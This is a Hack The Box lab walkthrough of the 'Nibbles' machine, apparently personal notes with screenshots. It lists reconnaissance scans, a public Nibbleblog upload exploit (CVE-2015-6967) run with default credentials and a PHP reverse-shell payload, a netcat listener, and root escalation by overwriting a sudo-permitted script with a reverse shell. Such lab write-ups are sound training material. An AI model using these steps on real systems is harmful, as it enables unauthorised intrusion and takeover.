<img src="Pasted image 20240720105538.png" alt="HTB Profile Image" class="htb-profile-img">

<style>
  .htb-profile-img {
    width: 100%;
    max-width: 800px;
    border-radius: 8px;
    box-shadow: 0 0 10px rgba(0, 255, 0, 0.8); /* Initial glow effect */
    transition: box-shadow 0.3s ease-in-out, transform 0.3s ease-in-out; /* Smooth transition for glow and zoom effects */
  }

  .htb-profile-img:hover {
    box-shadow: 0 0 20px rgba(0, 255, 0, 1); /* Enhanced glow on hover */
    transform: scale(1.05); /* Zoom effect on hover */
  }
</style>

**Ping** 
```
ping 10.10.10.75 
```
![[Pasted image 20240616130540.png]]

**Nmap default Scan**
```
nmap 10.10.10.75 -oN dnmap
```
![[Pasted image 20240616130724.png]]

**Nmap Script and Service Scan**
```
nmap 10.10.10.75 -sC -sV -A -oN snmap
```
![[Pasted image 20240616130804.png]]

Nmap All Port Scan
```
nmap -p- --min-rate 10000 10.10.10.75 -sC -sV -A -oN anmap
```
![[Pasted image 20240616131404.png]]
No hidden ports.

On port 80
![[Pasted image 20240616131453.png]]
Nothing Interesting on the main page

On Source Code
![[Pasted image 20240616131546.png]]
So there must be something in /nibbleblog directory

On /nibbleblog
![[Pasted image 20240616131630.png]]
Coool...!

Gobuster Scan
```
gobuster dir -u http://10.10.10.75/nibbleblog -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,html,txt,bak,conf -s 200,204,301,302,307,403 -k --status-codes "" -o gobuster1.txt
```
![[Pasted image 20240616131829.png]]
Found some interesting directories.

On ffuf Scan
```
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.75/nibbleblog/FUZZ -t 100 -o ffuf.txt
```
![[Pasted image 20240616131954.png]]

Lets read README file 
![[Pasted image 20240616133022.png]]
We got Version info

Will jump to Initial Foothold....!

Will Search for public Exploit.
![[Pasted image 20240616133130.png]]
Found one https://github.com/dix0nym/CVE-2015-6967

Will run the exploit accordingly
```
python3 exp.py --url http://10.10.10.75/nibbleblog/ --username admin --password nibbles --payload rev.php
```
![[Pasted image 20240616133212.png]]

Got shell
```
rlwrap nc -nvlp 443
```
![[Pasted image 20240616133238.png]]

Lets upgrade the shell
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
![[Pasted image 20240616133435.png]]

Found user.txt location
```
find / -type f -name "user.txt" 2>/dev/null
```
```
cd /home/nibbler
```
![[Pasted image 20240616133712.png]]

Got user.txt
![[Pasted image 20240616143402.png]]

Will jump to Privilege escalation....!




Will check our sudo privileges
```
sudo -l
```
![[Pasted image 20240616133911.png]]
Interesting...!

Lets check is there a file named monitor.sh or will create one
![[Pasted image 20240616134002.png]]
There a zip file

Will unzip it
```
unzip personal.zip
```
![[Pasted image 20240616134059.png]]
Got it...!

Will exploit this to escalate our Privileges

The original script
![[Pasted image 20240616142725.png]]

My permission on the file
```
ls -la
```
![[Pasted image 20240616142759.png]]

I have full permissions, so removed original script and replaced with my reverse shell script
```
cat monitor.sh
```
![[Pasted image 20240616142904.png]]

Now we can run this script as sudo
```
chmod +x monitor.sh
```
```
sudo ./monitor.sh
```
![[Pasted image 20240616143004.png]]

Set up listener to catch reverse shell
```
rlwrap nc -nvlp 443
```
![[Pasted image 20240616143109.png]]
Coool, got shell as root......!

Will get root.txt 
![[Pasted image 20240616143205.png]]



I'm done with Nibbles.....:)